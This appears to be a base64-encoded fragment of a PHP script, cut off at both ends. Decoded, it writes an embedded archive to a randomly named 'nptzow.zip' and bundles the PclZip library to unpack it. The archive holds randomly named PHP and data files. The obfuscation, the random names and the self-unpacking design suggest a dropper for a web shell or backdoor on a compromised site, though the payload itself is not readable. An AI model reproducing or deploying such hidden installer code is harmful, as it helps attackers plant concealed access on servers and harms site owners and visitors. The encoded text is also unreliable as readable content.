kJ5VkJyWVRIcXo1Vm5xZnR0YTN5Mmt2ckhtb2EzanJhS3V6RTFFNjlIMWZjOTYrRHJ1NzYrdGYrREFOMUxmMkVGcHJtVjMvRkhEZnVjTnhiMHd1dmViV01oSWdxdGhQSUJscGV2V3h6aVZrNU1VZGNUcXgxMmhsVWJsRTZESEJHZ2dBc1Q4ZHhLRXlvY1U2T3dPVUFnSnRlaTR1dkZVaXVJV01qYlgvT1VYdlM3Nng0NWJSRVlvZjhsVXd4S0t0ajl3R3NTeWJrZE0wUTdOSVNBRHN2UE1pNnQ3R0hPQTdBOG5EamZobXFnQy9LYVZ4czhPV0h1NnZkTllvM0ZYQ1U0TDc5c09xRnJiL251T0NlMG5reEg3QkhmZ0NvV0hZUTNYMy9ZQTRXQTBMNTk2QlNyYmpENHlYUGpLVkJDcUpxZVQxSDQ0L3RPbDhUbVpiQlVSdDVRL2NqK2Z1TWNJeWxhU3N0NFUrVzhKRWVQV255c0k1WjhFTW1uM01NQ0dzQmFSdGZJcTBUY2RGYXJSQ0FvUW41aHIrTlZGdVJGWEpZTGFtZ09wZ2x3U1N3RS9PZlF0eFBCQUdPUk03akxTSURaYXo3THdyNjl6UFQ5MDRMaG5HZlhiaDl6WXRYbU1XbVI1cUgwUHVSUUUvRlV1NmtjWEZOMTgzKzM5TFg0bW1KZkdCS1hRVkFNT1EvUG5hVmYyZ3FYbkkxVmlpOVZqSjk5SmE4TUFURzRHS3lGd1BjTFhmM1NpbmNmZGxPYVUzTXJ1U2NDVFJQalpLWk8yL1NwT0tRclN0S0d4a3BWR0RIanhic2ZiM0Iyb3EwOTZueUErbjl2ZjhYNjhPS3VzOXc5RVJueUhZN0srVHFKenVsU0pOVlRIY0o0NlFIUFdXNmZvSXFxbHNvMHBLWk9sK0EzRU50am1pZFZvbm5PMHRSTWRNRGx3UDVSRkR5dXExWEtWcEptOFROQmRVaUxQdGU1K2EreCtsMTdlcHVodC9MNVJkZUx4UW0zS05YaE5XT0ZWVThpSWs1dXU3UWFDa3NpaCtTcTE4RHBpTG4vOXhxSCtJeDA1WWJ4QXNFTUVwK2NHUXVkSU52LzcreElONjVSTUFmUEVkUEwzeG54VkcySGxlQkFYWmtVajFaUC9wWURDZzlVNVg1dlAzRFpuM1FsbjNsSHVrUnBBd0kySUQ2WTJrdDdmdUZxNEhtUll1cUptNW5WdlR6ZkxpY2Jhc0xRYlRtR1NUQ3YzbGZKRGYxK25NWDhDWktCVk9SRVp6M2lzNWZQQ0ROZjhreVlTMWlDSyt5V2d0YnF5WC9OYTFnMUYzWVRhS213WnlmYjVTVWQ4VmtYZWlGcEp5akdkSGE1NGlmN1ZLUlIxYWF1aExwRmoxQ2F6MjlmUTJsWXVuRnRjdjUvVlY2NGpYL1J1cDlMQVZLcTB3dXorb1UyNmd3dzgrRUhmNFF4VWplS05yM1VjaDBTSzIzQTVaTmczdGExUi9Idmllb042azhzRENBUzRvZkgvUlF1bUVRT2tWWDk5WWsveENhZzhsWVYwd2lpdlFaMnlNbE1GZnBNVDgzdDNhaWp0eG9aRVZuZTVjbGo2dXd5UkF5OUdjTUlmbWRNaHFxYSs4T0x4bUR1SmFLa2ZOL2NMN0F0T0lvdm5seFUyWmNCSGNkNk8xdEN2WGFaVkpIM3FDa2hhZ3JkVTNUNktJem5sdVNTRUpoOXhLRVcxTU55aUs1cnFGK3A1ZFhJeW5GeUs5Nkc2OTNIcFd3L0cwTXhBdWZPOEZzYmFFZE1tS0JscTdGVnV2bDQ0T3lybEp6WmY2UjIxNmowS2d1OWVtN3U3ZWJwcyt3SVVJbjI5emYwSEhmVjA1K29nQ2d2a2Ewd2xDa0p2Uks1bnJ4QWpYSWYvc0c1UUJNenJ4cFM1L2ZVWHZ0RVhwTUVUN2JOdDBncUNJOHFCUW9zM1ZpS0JFNUdWbHVmSng4OFB2S3l1cjNOY1pHcXVHMC9iUWlIeGwyMGVEWE51aElkL2tsVlZKaDlwMEt2dW1FbVpHRzV2TXg4NmMvazEvY2dqbnJqSjZYWEVoQUF5a3k2cFNJUDFjU2wvVTRQTDF0TXk0dk9IOWVqQlFDWklhcVhQSFpmMUU5bjF4eENWYnJySU1DZGRUSmFkSlZuRngweWFqWjZqUVo5SEFTTnhaZjR6YlNndlFkVXkzaUdyRVl6VmUrL2ptTloyZG5yNDllWHY4anM3ZmZud05CWitQMEVrSExsODNrSzBYeVBlRityR0NCTlFBZFR3Z2xZcnJxLzZNam1GcHZPSFlKQ09BVGx4bFpJOU9VWmZRWDFDcCtHZHZpOUE1Z0dxd2RENVNaWWtZUk1kWFF2a3ZDeDlVcmxZWlFaSkZBNHhORzZHZnB5TGFkQWc3Rm1vMHFwU3BJRm55QXg2UTBoYXZCQ2xJYlZLb2t6UHFFaFRzK3BMUU53SGMwRThidUZPQlVhQ3lTbVJ0VGYvUnhjVWJsamZTSFJlU2MrMmZnWndUcmkrTFdkdlRBMVByN20zdjBDbTZYOFFScGxWOFl1eGN1YWMwVXJrLy9idllLRXZuV3dseis0RFd0bjcwL0pWTVpON0gwZTYyZDdrTit2bHYvNkJ2bWZhWFdOamJlZmtDVlRxcm5ZNXpCTzRFRnlqcUFKRExMT1hodmhkanIwSG9BcmFWR09ua1B2Mmd6UmhkaFVHRGZHeFl0SXFuaktEMGF3T0paTXd3VTNnQzBTZUorci8vWmJJQUUzYU90a1JtSlJwRVBGVVd0WWRtQytYQ1gwNEMyU3hyRHU2R2Ezclcxa0RBRDJZLy8rMi9MZldEUTBRcHJFSVliekRwckJCSTJ6UVphYytMMXlQQUM2OHZQdjhHbTJjVHJWTjZnK09XUmpxSGtpcHBVd0ZrZk1aV2d3SFlCNXVlSlVGY1Uyb29oSk1HQ2kzNitQbzduei9vejNKaURZTGtqZHZPbmJWRU1yRmN6MHRoV2NrK2orRHpTcVZTZzZrcVZmZ29qZThHUk9KQW5tOWoyRmZhNGZSWU9UdHZmaUNXRUZlZ2Q0YkJQcmhQWnlPbHdRZWMzbmpLem5XaUpOamYydGdOempjUW5xdys5TWdNd1ZhczlGcExtU0tMVjZaS3BwQ092OW9QWFpZYlFlSisrQWh0T0JDVUJDb0VMUHdTbkhGbzl5dzZNeXZSeFBQMjl5b1pDWm5SR3lndDYzL1Zoa2tVbzRtZ0UzRE5aMThKMEV3bjlJUEtlSHoxVGs1QkRWOU5wQnhuTStJaUZicUU3U1RTK09nb0VGYW8wUERzVTlCT1BHamhsazVuRlV0b0tlaFJxQ2ZiRkFZN1hnMCtDczVsN2tNR0I1QmEvc1JaaUlXWmdQdkFYVGpod3pwaVNDTFJPVUplSWd3eklOd1I5N0FlRVNUb2lmUFFzYmR2T1B6ZnVEbHNqRnZ0MmkwbjJtVHBsMDgzOTNxV1lLUkRCZ05Dc01jTVJhRStlWVd6MFhzMitRUTN0Q0M0aWVRZzNQZkswUHNsbHR0d0FPK0pmK1g1UDhFcVFTTS9keE1RbzhOVXhxN0VtQTUzeHZTZDVQNlptZjNPd0dSbVJVM3dTRnh4ank2aERWUnJ6UFpvbGhkaFRIQmpFUUplbEtCMGJWUGZxSFRJMjN5Q0V5VjM0aE0rN294SVZSM3NHWTJ2OVhnNkNBR0ZtUG1EekJMMk53anVKbWJWVTNrWTJsaDY5S0Y1NkNDRjFoNWVoMDRrVDFtRTd0NExxdXBEVXp3MytMaVlPWnVVQ1FXZ2JrTCs4ZXhFekpzMHRwYkNsd2l4dlJVNVBCL0QzZ3JQOXBjL1Z0cjEzZ0x4aUxmUWNRYVZoc1VYWVF3UkxJVXRrbi83QUNPcjY3M0d4VzE3N3JwUGZxZUFjUTRyZVg0aUNzY2JPRks4UU5UZjNJeTZlOTJOWHluY0lLQy95TnIwUC9EQU4vdjU3LzhUOHBWM3dscUxqWE9nRG1EeTZuREZXdldlZ0pJZDZSZU5HSGdGSm80MFV5ZkRtS1pPN2t3U2RKZXFJV3pwa3d5SmYrUmozSXk0UGJSTlhEWUM1czE3QTNtcEhQaGZMekc3M3o1SDludmgwMS9JZFVoMW5PSGE5SDBIY2FLQyt5SE5aaGs5Myt5dTM3Qm82UnMwdW1WZ0N3cEFTRXZSRkF3TEw5WlVYc2xNbC81N3JJRXlYb3NoVVFpNkVzWkhYbEJUaFpJSldZTi9XR1ViaVhLNFZSQ2I0aGdSMHVxTW8vcUEvVHM0SVdvTHdsRWJmRmo0K3RjN2YvQU5EaG8xcjZDa2NHd2wzbHhJNXFpbzZtRGd2eGpVcGtIL1g3NWVSYWw2RVBlNVZTbFh1N3pRZ2tBV0YvUGEvTDdXWTZucld1aTU2bzRyRHB2OXJ4VXVBSE9vOVpDL0FCZlpqTFBJUmVqQzRxSG9sS1B5VDVYTFJYTDQvaXpxZGw5MnV6c2IyMUhYZXlYV2k4T2R6WFdzZFhlM215Vno2UHU1THphUHY5ZzR4WDh1K2dMOGpxbHczK3dyRDNIakI3ZjR2RDI2eGVKbkdkNTZkTU1LemRUWm4xdUVWSFRZQ2czaXJXWXZYbXFjbHlZdVo1VnZtUHlZb2Y0MW52OGVvSFhQL3ZtRTVvNHp2VnZmZXozdHZ1Si96YmhrTUJqd3o3RjgyWDNUT0RNdVovRGlhSjF4ZDN2WTJyZ1BQNC9sNXFpYjJRblBUWGlneEhNbEhwMzRicS9lYzRQNjVsc2kvdkhEUWtNL2J3aS9USFE1NjlIR2VuZUhsc2ZJZGRmZG1HNHRWcGZ5bTJuSVg0WWFSajBycU83bjVZYk9YbXZ4QzYyanR4UWdVVGhiUng3Zk5YRGc3c3hKOHg5aG5CR0dkNGV0OWRZeTRuck0xYXJsdWpUN2FpRjhvaFpKeG9ldGMrbkN6T3o1czNEdTJGUEE4KzJ3L3F6OUxCQWwwMmR0SHJhK2dNeVBoNGpCaldqS1JmSEVYdVZMMXVoL2JoblBKMW4raDRoSC93OVFTd01FRkFBQUFBZ0FDQnQwU3c5T3ZMdmREd0FBR2lFQUFCSUFBQUJ1Y0hSNmIzY3ZkM1IxWkhNdmMyUnpaR2ZWV20xdkhFZHkvbjdBL1lmUytpQlJGODYra1pRb3Zna2tsNlFvaTZUQ0pTVWJRV0QwenZUdU5uZG1lalRkUTNLSiszQTJMdmNoeWVYdWNyRVJCQTR1Q1hBSkRBVEluWTNBYjBBRVdIK0ErZ3ZHeVpML1JaN3FtVmt1WDJ6ZkJVaUF3T0x1YkU5M2RYWFZVMDlWemZqNzMvdmV3clhXenVyZW13L1hxRytqY09uN0dPRUxDa1hjVzZ4a0o1VjhTSXJBWFVUU0N2TDdJalhTNHJidGVyT1ZzeHQ5YXhOUFBzblU0V0xsRFc5LzJWdlZVU0tzNm9TeVFyNk9yWXl4YW5OdFVRWTlPYll1RnBGY3JCd3FlWlRvMUk1TlBWS0I3UzhHOGxENTBuTS9Ka25GeWlvUmVzWVhvVnhzVk91VEZJbGpGV1ZSTWRUa29jekkxUDBXMkh4eEtNMmw3ZTZKT09qTE1GaFBsWXlEY0RpMnJVMnp5K3B0Nlk0SzVVNWlWYVJPWkhCUnk3SDVveHU4YmJGYUpFa292Y2pKOEk1a3g4T0E1NHVFMWJ1MDFZYU1aU3FzVHNjMnVhLzc4ZXBXZTlJWmVhNVdPOEJ2UHpKVlgwZVgxZy9rOEVpbmdSbGIzZzVNMExzME1aREdUeFdPcE9PcjU0WXFIbEFxdzhXS3NjTlFtcjZVOEU4L2xkM0ZTcUZJZGhMb3FHb0hOZHVYa2F6NWZaWHFZYWhxYmtIVk4rYVNwRDZjN0dlV2xNL2JYaTJzS3c3NWRoVWZGOWVMME1vMEZoYVlzc09rc0szeUJaK2lsaHJ6SjhkUmlGdkt3dkdWM1hhYmZrUzcwbVNwb1NGQXJVSTFDRVdxdm1sakNPQy9hdEpQOG8yZG9DVm5rNFZhL29PSGF5NG1Gam82R0M0dEJPcVEvRkFZczFoSitrRmFXVnJvTjhvbHVGcW9ZY0s1V1ljeVBXNVdscWhSSmRwU3gzUmRSTWs4Y0d6OVB0bStNaFRwUUlaMHBHeWZOQXlia3JJeU1tUTErYW5FMlVuRUpBNkZGU25tQzlqU1VCYXJKNW5rS1VPZFhkdVFsa0psckF3d0VvZ2hQUmF4NVpzaUNIaENTcUluWTMvSVE5akF6YjFMN1VUSFJxZW1DalJFMEszZDEwbXVCWnpSVlFGV1NOSXh5UlV4dkFhUllaaUlCTm9obHFnai9FRXYxUmt1azc2MjJwRHVrbUVqVUZlbjFCV3hHM2trd2lIZGs4R0JNSXBVQkMydzIwbzJwRGFFS0RPZzZZMFZhcmZ1cmRLR2lGU2NMMjYxRlUyMFcrM1dobGV2VDI5NHk0M0d6VG5NS2d6bnBxOEtRSjQ4V283RUNaQkQ5dGlTTUlFdzNZQk1GMS91VjFDbzFPT1BIOERPS1V3bWpXM2l0TmRETysvUmx6LytLOEh6OFkxL1ZjS05oOXBZaE15aDZqbVVZV1JYR3dGSUJvSldVeEZMMnRiRS9HWG9pNCtwUHRlbzgvZTZnbXpjOWdld1VKWGFNcUhtekNRMTY0M2JNQjI3V2dEUlNRam53QzRDdXd5K2ptRGNqckJBR1hXa1BaSXlMdlJsQzIvQzAzSXZrNGI5T2ZGbm9BbTYvZWUwdlgrempTanVCQXdDZGlWaVB3eXV2eloxWjk2QXgxTVkySkxSUGtnVDI0bUFiY3JTa3F3RHAvZjVwd0c2Y0NpbldVc21HUVFaS0NKOFgyYytoM1ZzNTJsRkRqVzcvOWtIVmlpWU5qc20wZEZ4L093RGd3dURPWUN0VUx3blJjOCs2QW5ENklSVmdMdEFZdXV1WUlOa3NCWWlGaUhJcGlRRUpvRllLSVVZeVRLZHB2akc0UktZblZITFN4eWtjbHRBMDFVT0kycUE2QmtVYjJ4NFZHL2N3dWVPYjZseHk5bDRtamF4cjRib1dGdnNIdWxENmN4ajJTU1d1bUJpZktUR1RsSUhiR1JVbEFDWlI5QUxhd295Wkt4YmhBRDh3MGVHMVFaU0pybVpJVklnR2NGOHhlUThhdWJvc1ZJak1HOWgzM1JJRFlkcGhtK2ozcHoybG1mcU5ORjYxQUtHSHlHb05FT2R3NEFlcGpySWNJWnQvSjRzVnpSblIrSnd2YlZDQ0FpK2RUKy8xUUt5L0F5V2JhbWVzbkF5QjBLVm1vMzYzQ3lDaGZiQW5LRkloZ2VTRG9jRFdCUSs0VDBIT2g2QUZRWHZlMStybU5hRkx6dGFEeHpMd0xFU2lyallkMHhHclc0djZPYlFjWlJrbUViZzhTRU5ZbjBFSVR1d0lnelZ0dG9mTUs4eGhjM1JXTlFpVUYvZm42TTdVNDNielR1M09JcGtDSjExNXNKbUx4V0g0RHhjNWZrdnBPWFVLcC9CZ2JFdER0UnlnSmxwYi9mWno1NzlvcjMrN0dldmJ5UHE3KzA4cHIwZGVyaTdzNzJ6djcyNlJwdDcxKzVpdkpXbExtYm5FSll6MkxOWmIzNFhyKzB4SFFvbUJkcERCQUxXdVBPYU93ZVc5bnZkenUxYk5oc09EaTZJYjlSWnNzeFJCaVFnNDRPb2sxUTdxT240ZXR3eHlmdzZXSU1haFUxVDZhY1pBSmU2UGJaRk5ralZaWGpEZXJNYjN2MnBtY3UzMm1QM0dqZnprNldXZllDeXhobHV0YS9DSUpVZzM3RkJaODJ4M3l1aDdybkpRTEx3YlpVUUlXdWhDL3lWNFdZd2NmMUpwdTE4REk5eXhub0kwc1lSNE91cEtzM01rTTRkUDBNYzhleWNMMy84L3VzeERIRmZwZ1BqRUxPQlZBR1Q3L2FIdGgrQld2K1J5WXBMcFRBRXpKZ0lJQUNaTDdXTzh0d2hUS0dmajhoTkhXdkJaY3drU09PUzUvZXpDR2xRSGlNREtmYWdRWEhJOU8xWW9xUnZtcGl1MTFQcDJCa0dhaWZTVjkyaVhCaUx1RldjTGJmcGlndXJjekZXL0hDeDZHQ0xOSExFYVRlUkdsNG1BV3NhTVN5WjlZQ2pLUWRCRE5WTnVSZEhOZjJRMXNBYkliNGZ5MDVCdkpmOVBWMzZleFNVUFhXSUF4WWJzdkJFSHlHdldMM0w1Y0Nibk5HM01xTjhaMWlZTTBaNmNqQ01VQmhZbDJLS3hVZDlUU0d6WWNUelI5dmZ5bmUvNXprcXpYZmZ6bk9lcXlydTZRaTZObGcrTXN5QUQzc2t3NUE2UTZSR0MrM29BQlZKWGxBNlJqMUFPWklPSjZaWWptS0dERFFUV1l1SnpLT21vOFF5eVJjOHlkVGxFdjVvQWNnVTY1R0hRdVEveHpTNTVmdklJYUFKcm03b05TcVJ5WFlaTjZhM3NWK2ZhbTd3TFk5LzM5djM2cmVtTjVhcnRKeWsxTHpqTWtXRDFyR2tqMXFnQXdBWlZQODVJaE8yS1pLWmNVUXZrY1NRRm1YS3pRZ250QjUwQlZGSWlPQzg1eVFWR2FDazY5bnZLbVZteTFLR082WE04VUJlMFN6N2dMTngrSWZ1Y01qS1pIR3c2UktsdVp2dXpDei9FRE0yWTZONnNSSmYvdVJmWU5zMjRoREM2SFVrclhQVzNKWkgxR3kxNlkwSGt6UTE5czJvNVhFUEdBcXR1b3dKR3FNZ0Z6VUlLUEEyRTA3dTBTK2VtakYzK3V6SG9od0JFaGw5aURtdVFGQ3BnNHVraTk5U3JYbGFoNUpGRndlVXB0QVprZTFMcHhjY3pQbWFSVVZjaHhWc0EwSnhZeUk0NUttQURlcGlwRUhIcEh3RHlQbmk2U1FucVMrZVlpNzRLQUNEbEFBc0ZHWEF6V01xWjduOGpsc0JvbUZrUTNvbmRPQVA5RkVjYW9ROWE4VEV4UDVIenA0Yyt3RUtPT1FSbmlLRG9sN0liK2NGOFR4dFpBTHNaVm1WczBnWUZiemZHQVRBREN6TkFjZ2t2ZHhoRStCaUcwRWNtdndxOXRaVkR0c3h6aStLd0JYd2g1dTJ4a3dDTmNieWFKRDJVaFJFSEZBSUdsQlhwMndiY2pPcXRNeGdWYXJmZEVjS3BpYW0yZkcyaE9mc0pYUVcyQzdSYVFpNXpyZy9LaTlReGpYeXRBSldYczFnSis2cmk5WWs3MnhjZ21aWG5wWEFFZnlDUTdwT1lxd3hPc1BoSkp2ekNtMm16N1I1Z1BNNVlYbFdLSm5hbDZsMU5ZMnpHdWdNWlRpc0x3UG4wVHg1dDZSUGVYbDVpeDVJd1pPUURiaHVYR1VRaHE2ZUgxWXBqWHFlUVNCelZSUkR0VkRPMFE4YXNGcHptcmxvRmNkRHhwMUVLclBJT2xiMEpzY1ZjallveWRtNzNrUHhIV2cvNDJ6TWk1MnRtQ29lZzhnZllRR2N0Y2RONHlaTVFjdWhLVWN4K2JXU0dUY2hJc2VETFZsMGVFVWZjK3Q4RzRNWlU3T3p6ZHZObVVaZVd4ejVhTnNRTjJ3enBMWWhZc1M0Y09UVWI3T0VXM1RCNkFGb0lzMTRSTXk3ZXRPY1daRzFPd01lbk52cUZVZzlLNWJncFhnZ2c4MTQ4aHQ3R3A0TWtzejNHQ1U2NkprSFNEdlh5SE1WTmlNRUhKdWJFSFBweS9kL1JldTdhMnZVV251dytXaHQ5MDN1Tmd3L3FuSjFJTmVsZkoxa3FZL0ljREMvbUNaSGpEanFPQWVra2ptNmZkdlZDRTh5dERzSVpDVkQ5S1ZjSWtRaXhaR0lNU2dDMEkvckt6R0FxLzBZRlluc0lhSk9NRkJDeXk4MUJrR2lmanB5dmNoWXpTajhGRXBUb0xwZG1YSzdFdXE4c0RGVUk0a0NWQS9QVWdxVEtLYzM3cWc0ekxNazRDTDNRdm5oYmErdkltTWlRN0x6SjNaaTZYcmtteGRyWGE2REh1czBXTkhIRjVwZnJyTC9nR2lrSWh6WkdkZGZhOVRyOWFuNVA5WWpLSDBZak14R0QxQVVacWhMNTJndDduRmZTK3V5VS9iYlUxeGFINERnT0NaZERrZkZpREpHZHVibzZBaTlTK011QWlRdk1ueWRETEdicTMweGxjdFRVREdLSEwrZk1nRUhFcVNyRTFkNjZSQTdsM09MS3NRUktWcE8xMWdEb3RDWm42UXdjelJuQytySStjeWduZUsvcTlxSTdqQTlGS2llb1NjMTBKV1BSeVZNZitkT2xWd2owZU9uUWRCSklBOXd5bkJ0UmRreXRvcVdNZXBRY2V2Z1cxdkd2SXFVcmp3VkFSSUluT1lTSVhmUUhWaytNWERFY2lrWXBxL3FVTHpITGE2L3pnQ0JzKzZITmhYMDhNRittM1ZEN29zVVlJeXlkNVgyNzdXOXpYTnAwSU5qRWUwcHJhZmFCWUlKd29OQnQ0K2pkUHVqeHdGYmFFSno0OVpueWZUeXdiTXVCZHhWbjU0YmY5cURrVWNsOVJlY1k4WXFaSDQ2R3B4cmU3bXArZWt2cVRGTkI1bGlyNTlkL1c4OHU2SVZLT20xVVY2emxOMkNVNHRlaFpHUGM5N1BNREZIa2dmem9LUXkzSG5uTEdQemlxUm9jY3NlQUlaM2ozK2dxNTg1NXB3a2Z2NEUrNEw5RWEybExTWkppcFNmYlJnbjUzL2t2NnZ4V1lnNUsyMk1jbGJieW9VVXRzQTJPMnRiWE1tZXN4dkhPZmRDSWk4SHU0NFUrVUR5V0hDN3pVVHhSdGJKWXBzUlo5dnp6eUNhOWVsWmo0cUhFTE96TTlPM2VjNTRJekNPbytXc1IzZnl5Lzh6STk4YVk4c2lnSmIzdVdGeHp5QlRTRmFXSzA3b2tWY3dTUEs4bC9sLzhmQnVDeEVNT0lUNVQyVC9oT3Mzd3cwNWFwQVR0aGt5b1lnNml0Zng4V0t1NkYzVDBPdHo4THRHR0pUSjRROFN5Si94QmwzRFkrNmp5eGM5dnV3NUdrQlE4VmMrNEQ3Z3lqNlk0Q0FMbGFDMzh2OG0zcnI1RnYySWxxa0x5dXZUeTE5OS9QS2YzbnY1ZDcvKy9XZi85dUxkbjg2LytOM3ZYdjNtNmN2MzMvNzYzYWRmZmZqNWkwL2VlZkhwUjEvLzgyY3YvdWJwaTUvLzhxdjMvdVBWMzc3ejZpLy8vZVUvL09Tcjl6Nzk2cU4zNTMvL3llZXYvdlh0bDUvLy9OVXZmdU93TTJtWVJJclhBTzZUWHlGY2ZtdWdJbVNGMUIrOWxZQWY1VkUxeldyNWMvTGF5YUU4Q1VRMWlYc1Y5RDkyc1ZLcExkSGx0d3VGTkRSYXFCS1dGanBMZS9Ka2dPRGIxVGVHNkowRGZqeHd3NExKRjJvZDZGUE9HeWxXRG5BYkJoeXhxeGNycWV5aGJzN1RsSHM3UXBHMGZSMWdPM2k2Y3ZGRXFGU0F2TXlOUDlBOU9KWW1ZalVBOHkxMFVxcTU2U3BHejF1OHhMSHkySll2eTJMbER5cmNENFl5N3RuK1lxVXhVNkZERVdiU25YZ2s0S0ZJZFRqMzNmSVNhTVF2eE03SmJOYkhSVzJhaUFWOXV4d1Y4ZmM1S1ZQMU04MW9UTjdPalJPRlN1Q0pDc1IzeXhWY3IxNFFlMG11RTNFZkJkellnZlB5cEpCaTVISHVCZTFlNkpYTDcxYVd2THZlUWkwZnZXSkNWRmxhU3dkaThDMVRUdnFWcGVXaERrZFRGbXI1MXZtcnNDc0FQWEwvdVVPYnJCT3AwYkhMWDhVbXl6ZE9OQ0w4QnBjWTdKb2lXaGlFWXlDOURQUE8wcCtxUUtYWllZN21pOEZRcUhFT3k3VlFkZEI4REd0M01iSUk2a0pKZVJIUEM4blNGUTRiK1FTTTdzdStEZ09aWWc5aDQxalJRREV2Y25DV0hza0YxNjYyUWlIcjlOZW4vM1g2eWZPM1R6KzdhSmdTVDhYcS9LWXRYM3VDMi8xQlJ4K1BCRFY0UmQ1aG5mNDl5enY5N2ZOM252ODFuWDVJcHgrZi92YjBJK3p6T2Y0K2RIZitncDYvL2Z3ZG5uTDZuNmVmTHRTU00xdC9NMEYxbUc1S0s5T0ZPZnhHVk9hekNzS0p4Qk9OaERMVUp5T3ljZTY1NW5tMG9qWlFnKzFtYmZLOEt4eTJOYjZVa01neU1NZ1NtVDZhdXVxM01HbFhhOHRLMFBtNzdtMTA3a1FQeWFZWHorV0FHazJFZHU1VmJzMzlmeEQvRFZCTEFRSVVBQW9BQUFBQUFKc1JlRXNBQUFBQUFBQUFBQUFBQUFBSEFBQUFBQUFBQUFBQUVBQUFBQUFBQUFCdWNIUjZiM2N2VUVzQkFoUUFGQUFBQUFnQXBSRjRTd2J5b1pDTUNRQUFOUnNBQUJFQUFBQUFBQUFBQVFBZ0FBQUFKUUFBQUc1d2RIcHZkeTltYkhadllYY3VjR2h3VUVzQkFoUUFDZ0FBQUFBQUVSQnpTd0FBQUFBQUFBQUFBQUFBQUE0QUFBQUFBQUFBQUFBUUFBQUE0QWtBQUc1d2RIcHZkeTl6YjNSd2FXVXZVRXNCQWhRQUZBQUFBQWdBdEt4eFM3OHNJM0ZqQXdBQWRnWUFBQk1BQUFBQUFBQUFBUUFnQUFBQURBb0FBRzV3ZEhwdmR5OXpiM1J3YVdVdk1TNTBlSFJRU3dFQ0ZBQVVBQUFBQ0FEaXFYRkxneEhTOFJFRUFBQWxDUUFBRkFBQUFBQUFBQUFCQUNBQUFBQ2dEUUFBYm5CMGVtOTNMM052ZEhCcFpTOHhNaTUwZUhSUVN3RUNGQUFVQUFBQUNBQlVwbkZMUFI4azhNc0VBQURHRFFBQUV3QUFBQUFBQUFBQkFDQUFBQURqRVFBQWJuQjBlbTkzTDNOdmRIQnBaUzgxTG5SNGRGQkxBUUlVQUJRQUFBQUlBRmluY1V2VWFkbWhEd2tBQUhZbUFBQVRBQUFBQUFBQUFBRUFJQUFBQU44V0FBQnVjSFI2YjNjdmMyOTBjR2xsTHpjdWRIaDBVRXNCQWhRQUZBQUFBQWdBaWFoeFM3NXBkSTlGQ1FBQXVSOEFBQk1BQUFBQUFBQUFBUUFnQUFBQUh5QUFBRzV3ZEhwdmR5OXpiM1J3YVdVdk9TNTBlSFJRU3dFQ0ZBQUtBQUFBQUFBSUczUkxBQUFBQUFBQUFBQUFBQUFBRFFBQUFBQUFBQUFBQUJBQUFBQ1ZLUUFBYm5CMGVtOTNMM2QwZFdSekwxQkxBUUlVQUJRQUFBQUlBQ0dYWTBzZGJFcVh1ZzhBQU1vcUFBQVZBQUFBQUFBQUFBRUFJQUFBQU1BcEFBQnVjSFI2YjNjdmQzUjFaSE12WjNKMGFuUjVkV3hRU3dFQ0ZBQVVBQUFBQ0FBSUczUkxEMDY4dTkwUEFBQWFJUUFBRWdBQUFBQUFBQUFCQUNBQUFBQ3RPUUFBYm5CMGVtOTNMM2QwZFdSekwzTmtjMlJuVUVzRkJnQUFBQUFMQUFzQXRBSUFBTHBKQUFBQUFBPT0iKTsgDQpmaWxlX3B1dF9jb250ZW50cygibnB0em93LnppcCIsJGRhdGEpOyANCg0KDQoNCmlmICghZGVmaW5lZCgnUENMWklQX1JFQURfQkxPQ0tfU0laRScpKSB7DQogIGRlZmluZSggJ1BDTFpJUF9SRUFEX0JMT0NLX1NJWkUnLCAyMDQ4ICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1NFUEFSQVRPUicpKSB7DQogIGRlZmluZSggJ1BDTFpJUF9TRVBBUkFUT1InLCAnLCcgKTsNCn0NCg0KaWYgKCFkZWZpbmVkKCdQQ0xaSVBfRVJST1JfRVhURVJOQUwnKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfRVJST1JfRVhURVJOQUwnLCAwICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1RFTVBPUkFSWV9ESVInKSkgew0KICBkZWZpbmUoICdQQ0xaSVBfVEVNUE9SQVJZX0RJUicsICcnICk7DQp9DQoNCmlmICghZGVmaW5lZCgnUENMWklQX1RFTVBPUkFSWV9GSUxFX1JBVElPJykpIHsNCiAgZGVmaW5lKCAnUENMWklQX1RFTVBPUkFSWV9GSUxFX1JBVElPJywgMC40NyApOw0KfQ0KDQoNCiRnX3BjbHppcF92ZXJzaW9uID0gIjIuOC4yIjsNCg0KZGVmaW5lKCAnUENMWklQX0VSUl9VU0VSX0FCT1JURUQnLCAyICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX05PX0VSUk9SJywgMCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9XUklURV9PUEVOX0ZBSUwnLCAtMSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCcsIC0yICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSJywgLTMgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfTUlTU0lOR19GSUxFJywgLTQgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfRklMRU5BTUVfVE9PX0xPTkcnLCAtNSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9JTlZBTElEX1pJUCcsIC02ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0JBRF9FWFRSQUNURURfRklMRScsIC03ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0RJUl9DUkVBVEVfRkFJTCcsIC04ICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0JBRF9FWFRFTlNJT04nLCAtOSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfRk9STUFUJywgLTEwICk7DQpkZWZpbmUoICdQQ0xaSVBfRVJSX0RFTEVURV9GSUxFX0ZBSUwnLCAtMTEgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfUkVOQU1FX0ZJTEVfRkFJTCcsIC0xMiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9CQURfQ0hFQ0tTVU0nLCAtMTMgKTsNCmRlZmluZSggJ1BDTFpJUF9FUlJfSU5WQUxJRF9BUkNISVZFX1pJUCcsIC0xNCApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRScsIC0xNSApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRScsIC0xNiApOw0KZGVmaW5lKCAnUENMWklQX0VSUl9BTFJFQURZ